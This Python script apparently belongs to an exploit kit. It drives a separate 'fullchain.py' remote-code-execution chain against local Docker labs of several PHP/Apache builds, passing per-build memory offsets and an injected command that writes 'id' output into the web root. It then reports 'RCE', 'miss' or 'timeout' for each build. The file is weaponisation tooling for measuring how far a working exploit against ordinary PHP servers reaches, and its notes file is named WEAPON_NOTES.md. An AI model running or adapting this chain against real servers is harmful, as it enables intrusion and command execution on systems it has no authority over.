#!/usr/bin/env python3
"""matrix.py - run the full chain against every local lab image and tabulate.

The chain's leak depends on PHP internals that changed across branches, so
coverage has to be measured per build, not assumed. Labs are the reference
Dockerfile rebuilt per tag (see WEAPON_NOTES.md for ports).

Usage: python3 matrix.py            # all known labs with offsets
       python3 matrix.py 8.4.26     # one build
"""
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
LABS = {                    # build -> lab port
    "8.5.11": 8089,
    "8.4.26": 8088,
    "8.3.35": 8091,
    "8.2.34": 8090,
    "8.1.34": 8092,
}


def run(build, port):
    off = json.load(open(os.path.join(HERE, "offsets.json"))).get("php-%s-apache" % build)
    if not off:
        return "no offsets"
    try:
        p = subprocess.run(
            [sys.executable, os.path.join(HERE, "fullchain.py"), "--host", "127.0.0.1",
             "--port", str(port), "--path", "/index.php",
             "--zif-offset", off["zif"], "--dtor-offset", off["dtor"],
             "--cmd", "id>/var/www/html/m.txt", "--fetch", "/m.txt",
             "--r0-lo", "0x50000", "--r0-hi", "0x80000"],
            capture_output=True, text=True, timeout=420)
        return "RCE" if p.returncode == 0 else "miss"
    except subprocess.TimeoutExpired:
        return "timeout"


def main():
    want = sys.argv[1] if len(sys.argv) > 1 else None
    print("%-8s %-5s %s" % ("build", "port", "result"))
    for build, port in sorted(LABS.items()):
        if want and build != want:
            continue
        print("%-8s %-5d %s" % (build, port, run(build, port)), flush=True)


if __name__ == "__main__":
    main()
